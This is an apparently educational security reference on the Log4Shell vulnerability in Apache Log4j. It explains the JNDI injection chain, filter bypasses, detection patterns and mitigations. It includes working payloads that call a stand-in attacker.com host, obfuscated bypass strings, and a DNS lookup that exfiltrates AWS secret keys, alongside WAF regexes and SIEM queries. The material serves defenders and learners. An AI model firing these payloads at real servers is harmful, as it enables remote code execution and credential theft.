Log4Shell — CVE-2021-44228

Category: Vulnerability — Remote Code Execution via JNDI Injection
CVE: CVE-2021-44228 (Log4Shell); CVE-2021-45046 (bypass of initial fix); CVE-2021-45105 (DoS); CVE-2021-44832
CVSS Score: 10.0 (Critical) — Maximum possible score
Affected: Apache Log4j 2.0-beta9 through 2.14.1 (CVE-2021-44228); 2.15.0 (CVE-2021-45046)
Disclosed: December 9, 2021 — published on Twitter by security researcher before coordinated disclosure
Fixed: Log4j 2.17.1 (Java 8); 2.12.4 (Java 7); 2.3.2 (Java 6)

Overview

Log4Shell is the most significant remote code execution vulnerability in recent history. Log4j is the most widely used Java logging library — it is embedded in thousands of products including Apache Solr, Apache Kafka, Apache Struts, ElasticSearch, VMware vCenter, Minecraft Java Edition, AWS CloudFront, Cisco WebEx, and hundreds of enterprise software products.

The vulnerability: Log4j 2.x has a "message lookup" feature that evaluates special ${...} syntax in log messages. When an application logs a user-controlled string (like a username, HTTP header, or search query), if that string contains ${jndi:ldap://attacker.com/a}, Log4j makes an outbound LDAP request to the attacker's server. The attacker's LDAP server returns a reference to a Java class file. Log4j downloads and instantiates that class — executing arbitrary code in the JVM of the vulnerable server.

At Google scale, Log4Shell required emergency response across thousands of internal and external services. Google CISA advisory classified it as one of the most serious vulnerabilities ever. Within 72 hours of disclosure, attackers were mass-scanning the internet and deploying ransomware, cryptominers, and reverse shells.

How Log4Shell Works

Attack Mechanism — Step by Step

sequenceDiagram
    participant A as Attacker
    participant S as Vulnerable Server (Log4j 2.x)
    participant LDAP as Attacker LDAP Server
    participant C as Malicious Java Class (.class file)

    A->>S: HTTP request with malicious header
    Note over A,S: User-Agent: ${jndi:ldap://attacker.com:1389/exploit}
    S->>S: Application logs the User-Agent string
    S->>S: Log4j processes the log message
    S->>S: Log4j sees jndi: syntax trigger
    S->>LDAP: LDAP lookup to attacker.com:1389/exploit
    LDAP->>S: LDAP response: load class from http://attacker.com/Exploit.class
    S->>C: HTTP GET http://attacker.com/Exploit.class
    C->>S: Returns malicious Java bytecode
    S->>S: JVM loads and instantiates Exploit.class
    S->>A: Reverse shell or malware callback

The Payload

Any HTTP request field that reaches a Log4j logging statement can be a vector:

GET / HTTP/1.1
Host: target.example.com
User-Agent: ${jndi:ldap://attacker.com:1389/a}
X-Forwarded-For: ${jndi:ldap://attacker.com/a}
Referer: ${jndi:ldap://attacker.com/a}
X-Api-Version: ${jndi:ldap://attacker.com/a}
Username: admin${jndi:ldap://attacker.com/a}

Any of these trigger if the application calls log.info("User-Agent: {}", userAgent) or similar.

Why JNDI Makes This Work

JNDI (Java Naming and Directory Interface) is a Java API for looking up objects by name from directory services (LDAP, RMI, DNS). Log4j's MessageLookup feature allowed JNDI lookups to be embedded in log messages as a convenience feature (for dynamic configuration). This feature converts a log message into an outbound network request and potential remote class loading.

Remote class loading:
- Before Java 8u121 (2017): JVM would remotely load and execute any class referenced by LDAP JNDI
- After Java 8u121: Remote class loading is disabled by default
- But: LDAP response can still reference a local Java factory class and supply attacker-controlled serialized Java objects for deserialization — also leads to RCE via deserialization gadget chains

Bypass Techniques for Initial Mitigation

The initial fix in Log4j 2.15.0 was incomplete. Attackers quickly found bypasses:

Bypass Technique CVE
Obfuscated JNDI ${${lower:j}ndi:...}, ${${::-j}ndi:...} Original
Non-LDAP protocols ${jndi:rmi://...}, ${jndi:dns://...}, ${jndi:ldaps://...} Original
Context lookup ${ctx:loginId} plus other lookup substitution chains CVE-2021-45046
Nested lookup ${${env:ENV_NAME:-j}ndi:...}, ${${env:BARFOO:-j}${lower:n}di:...} Original

Security teams had to block not just jndi:ldap:// but all variations, which is nearly impossible with pattern matching.

Vulnerability Root Causes

Root Cause Description
Logging user-controlled data Applications log HTTP headers, usernames, search queries — all attacker-controlled
Feature over security JNDI lookup in log messages was a "power feature" that enabled deserialization attacks
Transitive dependency Log4j is often a transitive dependency — you use library X, which uses library Y, which uses Log4j
Default-enabled dangerous feature JNDI message lookup was enabled by default; no usage needed for the vulnerability to be exploitable
Java's remote class loading JVM design allowed loading and executing arbitrary remote bytecode via JNDI

Attack Scenarios

Scenario 1: Direct RCE

  1. Attacker sends ${jndi:ldap://attacker.com/a} in a header
  2. Server makes outbound LDAP request to attacker's server
  3. Attacker's LDAP server responds with a reference to a malicious Java class
  4. Server downloads and executes the class
  5. Malicious class opens a reverse shell: Runtime.getRuntime().exec("bash -c {...}")

Scenario 2: Data Exfiltration via DNS (Blind)

Even without a callable LDAP server, the DNS lookup itself leaks information:

${jndi:dns://${env:AWS_SECRET_ACCESS_KEY}.attacker.com/a}

This embeds environment variable values in the DNS lookup hostname — exfiltrating secrets through DNS queries that cannot be blocked without blocking DNS entirely. Attackers used this to exfiltrate AWS credentials, internal hostnames, and environment configs.

Scenario 3: Cloud Metadata Access from Log4j Server

${jndi:ldap://169.254.169.254.attacker.com/${env:AWS_REGION}}

Attacker uses the DNS lookup to discover if the server is in a cloud environment and what region/metadata is accessible.

Detection

WAF Detection Patterns

# Pattern 1: Basic JNDI
\$\{jndi:

# Pattern 2: Obfuscated
\$\{[^}]*[jJ][nN][dD][iI][^}]*:

# Pattern 3: Nested lookups
\$\{.*\$\{.*

# Pattern 4: Unicode/URL encoded  
%24%7Bjndi

Problem: The obfuscation techniques make regex detection an arms race. Attackers use nested lookups (${${lower:j}ndi:...}) that any fixed pattern set will miss.

SIEM Detection Queries

Look for outbound connections to unusual external hosts from application servers, especially on ports 1389 (LDAP), 1099 (RMI), and unusual DNS lookups from application servers.

# Cloud Logging / Splunk: outbound LDAP connections from app servers
source=network_flow dest_port=1389 OR dest_port=389 src_category=app_server

# Unusual outbound DNS lookups from app servers  
source=dns_logs requester=app_server query !~ "*.internal.*" query !~ "*.google.*"

Mitigation and Response

Immediate Steps (December 2021 — the playbook)

Step Action Priority
1 Identify all Java applications in your environment P0
2 For each Java app: identify if Log4j is a direct or transitive dependency P0
3 Block outbound LDAP/RMI/DNS from application servers via network egress rules P0
4 Deploy WAF rules to block JNDI payload patterns P0
5 Set log4j2.formatMsgNoLookups=true JVM flag as temporary workaround P0
6 Upgrade all Log4j to 2.17.1 P1
7 Hunt for compromise: check for outbound connections to unknown LDAP servers P0

Mitigating Controls

# Control How It Helps
1 Upgrade to Log4j 2.17.1 Removes JNDI lookup feature entirely from message patterns
2 JVM flag: -Dlog4j2.formatMsgNoLookups=true Disables message lookup processing (not in all versions)
3 Network egress filtering Block outbound LDAP (389, 636, 1389), RMI (1099), DNS from app servers to internet
4 WAF JNDI pattern detection Catch most non-obfuscated payloads in transit
5 Java 8u191+ or Java 11 Remote class loading disabled by default; reduces but doesn't eliminate risk
6 Software Composition Analysis (SCA) Continuous scanning of dependencies (Dependabot, Snyk, Google's Open Source Insights)
7 SBOM (Software Bill of Materials) Know every transitive dependency in every artifact — enables instant assessment

Key Takeaways

  • Log4Shell is a CVSS 10.0 RCE vulnerability triggered by logging any user-controlled string that contains ${jndi:...}.
  • The attack chain is: attacker input → logged by Log4j → JNDI lookup → remote code loading → arbitrary Java code execution.
  • Log4j is a transitive dependency in thousands of products — the attack surface was enormous and difficult to inventory.
  • Egress filtering (blocking outbound LDAP/RMI from app servers) is the most effective compensating control while patching.
  • The obfuscation bypass landscape (${${lower:j}ndi:...}) makes WAF/pattern blocking an inadequate sole defense.
  • SBOMs and SCA tools are now industry-mandated practices (CISA/White House executive order) directly as a result of Log4Shell.
  • The correct fix is upgrading to Log4j 2.17.1+ which removes lookup from message pattern evaluation entirely.
